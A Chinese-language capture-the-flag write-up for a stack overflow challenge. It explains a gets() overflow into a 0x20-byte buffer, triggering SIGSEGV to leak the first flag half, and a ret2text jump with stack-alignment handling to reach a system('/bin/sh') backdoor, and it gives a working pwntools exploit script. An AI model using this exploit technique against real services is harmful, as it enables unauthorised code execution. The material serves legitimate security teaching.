# Stack overflow

## 题目简述

程序在栈上定义 `char buffer[0x20]`，随后使用无长度限制的 `gets(buffer)`。二进制无 PIE、无栈 Canary，NX 开启。题目把 flag 分成两半：

- 程序为 `SIGSEGV` 注册 `getflag()`，发生段错误时执行 `cat /flag1`。
- 文本段中存在 `whaaaaat()` 后门，调用 `system("/bin/sh")`，取得 shell 后可读取 `/flag2`。

因此先用任意非法返回地址触发段错误获得前半，再控制返回地址完成 ret2text 获得后半。

## 解题过程

### 触发 SIGSEGV

反编译可见 `buffer` 位于 `rbp-0x20`。覆盖 0x20 字节缓冲区和 8 字节保存的 `rbp` 后，下一段 8 字节就是返回地址，所以偏移为 `0x28`。

发送远超该长度的数据，使返回地址变为不可访问值。函数返回时触发 `SIGSEGV`，信号处理函数输出 `/flag1`。

### ret2text 与栈对齐

直接把返回地址改为后门函数入口 `0x4012bd`，虽然能进入 `whaaaaat()`，但函数序言还会执行一次 `push rbp`，导致进入 glibc `system()` 时栈未满足 x86-64 ABI 的 16 字节对齐要求，最终在 `movaps` 指令处崩溃。

可以在 ROP 链中额外加入一个 `ret`，也可以像官方脚本一样跳到 `0x4012c2`，从 `mov rbp, rsp` 开始执行，略过 `push rbp`。后者减少一次压栈，使调用 `system()` 时重新对齐。

连接参数由 `HOST`、`PORT` 环境变量提供：

```python
import os
from pwn import *

context.arch = "amd64"
HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])

# 第一条连接：触发 SIGSEGV，读取 flag1。
io = remote(HOST, PORT)
io.sendlineafter(b"her:\n", b"A" * 0x100)
print(io.recvall(timeout=2).decode(errors="ignore"))

# 第二条连接：覆盖 RIP，跳过后门函数的 push rbp。
io = remote(HOST, PORT)
payload = b"A" * 0x28 + p64(0x4012c2)
io.sendlineafter(b"her:\n", payload)
io.sendline(b"cat /flag2")
io.interactive()
```

将两次输出按顺序拼接即可还原完整 flag。源码仓库没有提交 `/flag1` 和 `/flag2` 的实际内容，因此不补写无法从附件核验的固定字符串。

## 方法总结

- 核心技巧：利用 `gets()` 栈溢出分别触发信号处理器和 ret2text 后门。
- 识别信号：无 Canary、无 PIE、存在显式后门函数，同时 `system()` 内出现 `movaps` 崩溃。
- 复用要点：x86-64 ROP 不只要控制 RIP，还要维护调用点的 16 字节栈对齐；额外 `ret` 或跳过一次 `push` 都可以调整 8 字节偏差。
